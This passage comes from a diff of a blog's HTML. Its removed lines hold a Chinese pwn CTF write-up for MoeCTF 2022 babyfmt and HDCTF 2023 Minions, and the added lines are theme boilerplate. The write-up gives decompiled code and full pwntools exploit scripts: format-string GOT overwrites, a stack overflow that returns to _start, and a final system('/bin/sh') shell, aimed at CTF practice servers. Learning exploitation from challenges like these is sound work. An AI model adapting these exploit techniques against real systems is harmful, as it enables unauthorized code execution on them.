class="number">3</span>)+p64(pop_rsi_addr)+p64(name_addr)+p64(pop_rdx_rbx_addr)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">ORW+=p64(pop_rdi_addr)+p64(<span class="number">1</span>)+p64(pop_rsi_addr)+p64(name_addr)+p64(pop_rdx_rbx_addr)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)  <span class="comment"># 向 name_addr 处填入b&#x27;./flag\x00\x00&#x27; 并补齐 8 字节，将长度填充到 0x28 至返回地址处</span></span><br><span class="line">payload += ORW</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="MoeCTF-2022-babyfmt"><a href="#MoeCTF-2022-babyfmt" class="headerlink" title="[MoeCTF 2022]babyfmt"></a>[MoeCTF 2022]babyfmt</h2><blockquote>
-<p>got劫持</p>
-</blockquote>
-<img src="/2025/11/26/pwn-11/image-4.png" class=""> 
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [esp+18h] [ebp-110h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [esp+1Ch] [ebp-10Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+11Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10u</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p&quot;</span>, backdoor);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift: %p\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xFFu</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>放进IDA可以看到有后门函数，但由于主函数是一直循环的，不能将地址直接覆盖为后门函数地址<br>那就是使用got劫持了，首先保护措施“Partial RELRO”，意味着GOT部分可写，即.got劫持可行<br>，通过格式化字符串漏洞的任意写将printf的got地址写成后门函数的地址，当再执行printf函数时就可以getshell</p>
-<img src="/2025/11/26/pwn-11/image-5.png" class=""> 
-<p>发现偏移为11</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./pwn&quot;</span>)  <span class="comment"># 程序路径</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=remote( <span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">23990</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got=<span class="number">0x0804A010</span></span><br><span class="line">backdoor=<span class="number">0x0804859B</span></span><br><span class="line">payload = p32(printf_got) + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(backdoor-<span class="number">4</span>).encode() + <span class="string">b&#x27;c%11$n&#x27;</span></span><br><span class="line"><span class="comment">#分解为三部分：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.p32(printf_got)= 4字节的地址 0x0804A010</span></span><br><span class="line"><span class="comment">#2.b&#x27;%&#x27; + str(backdoor-4).encode() + b&#x27;c&#x27;= 输出控制</span></span><br><span class="line"><span class="comment">#3.%11$n= 写入指令</span></span><br><span class="line"><span class="comment">#p32(printf_got)   将0x0804A010压入栈的第11个位置</span></span><br><span class="line"><span class="comment">## backdoor = 0x0804859B = 134,514,075 (十进制)</span></span><br><span class="line"><span class="comment"># backdoor - 4 = 134,514,071</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x27;%134514071c&#x27;   这个格式化符会输出134,514,071个空格字符</span></span><br><span class="line"><span class="comment">#%11$n  将输出的字符数写入到第11个参数所指向的地址中</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>而栈的一行刚好能存储4B的数据（p32(printf_got)刚好4B），即格式控制符%11$n对应的要写入的地址就是printf_got<br>通过%c能控制输出字符的数量，控制p32(printf_got) + b’%’ + str(backdoor-4).encode()输出的字符数量刚好等于0x0804859B，与%n形成配合，最终使得printf_got地址处被写入了地址0x0804859B即backdoor的地址</p>
-<p>但其实有函数直接将这些步骤执行了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x0804A010</span></span><br><span class="line">backdoor = <span class="number">0x0804859B</span></span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">11</span>,&#123;printf_got:backdoor&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>
-<p>fmtstr_payload函数帮我们干了所有的事情（除了定位输入位置，11）</p>
-<p>定位好位置后，我们只需要输入一个字典元素比如Poc中的{printf_got: backdoor}</p>
-<p>这个字典清晰地描述了我们的意图，即：“我想要在printf_got这个地址，写入backdoor这个值”</p>
-<p>我们也可以同时提供多个写入目标，例如 {addr1: val1, addr2: val2}，pwntools会自动帮你生成一个能完成所有写入的payload</p>
-<h2 id="HDCTF-2023-Minions"><a href="#HDCTF-2023-Minions" class="headerlink" title="[HDCTF 2023]Minions"></a>[HDCTF 2023]Minions</h2><img src="/2025/11/26/pwn-11/image-7.png" class=""> 
-<p>放进IDA，查看主函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nDo you have an invitation key?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">102</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;welcome,tell me more about you&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s great.Do you like Minions?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;hdctf, <span class="number">0x28u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry,you can&#x27;t in&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>先进入vlun函数，查看vlun</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-D0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HDCTF.What you name?\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xD0u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>还发现了一个后门</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40075A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo HDCTF&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现格式化字符串漏洞，可以测试printf的偏移，然后将key改为102</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">24763</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">r&#x27;./1&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"> </span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 利用vuln()函数里格式化字符串漏洞  覆盖key 满足 key==102</span></span><br><span class="line">key_addr = <span class="number">0x6010A0</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;key_addr: <span class="number">0x66</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 栈溢出 使函数返回 _start  为重新执行vuln()里的printf</span></span><br><span class="line">Padding = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span> + <span class="number">0x08</span>)</span><br><span class="line">payload_vuln = Padding + p64(start_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;tell me more about you&quot;</span>,payload_vuln)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Minions?&quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 利用vuln()函数里格式化字符串漏洞 修改 printf_got为system_plt</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got: sys_plt&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 栈溢出 返回 _start重新执行 vuln()里的printf</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;tell me more about you&quot;</span>,payload_vuln)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Minions?&quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># send /bin/sh printf即system 调用 /bin/bash 得到shell</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-
-
+</span>
 
           </div>
-          
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/pwn/">#pwn</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
 
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
 
+
+
+
+              </div>
+            </div>
+          </div>
         </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
       </div>
-      <!--/noindex-->
+    
 
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">John Doe</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">5</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
       </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">1</span>
-        <span class="site-state-item-name">categories</span></a>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">3</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+  </div>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
-  </div>
 
-        
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
 
 
 
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
 
 
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-
-
-
-
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
 
 
   
 
-  
-
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
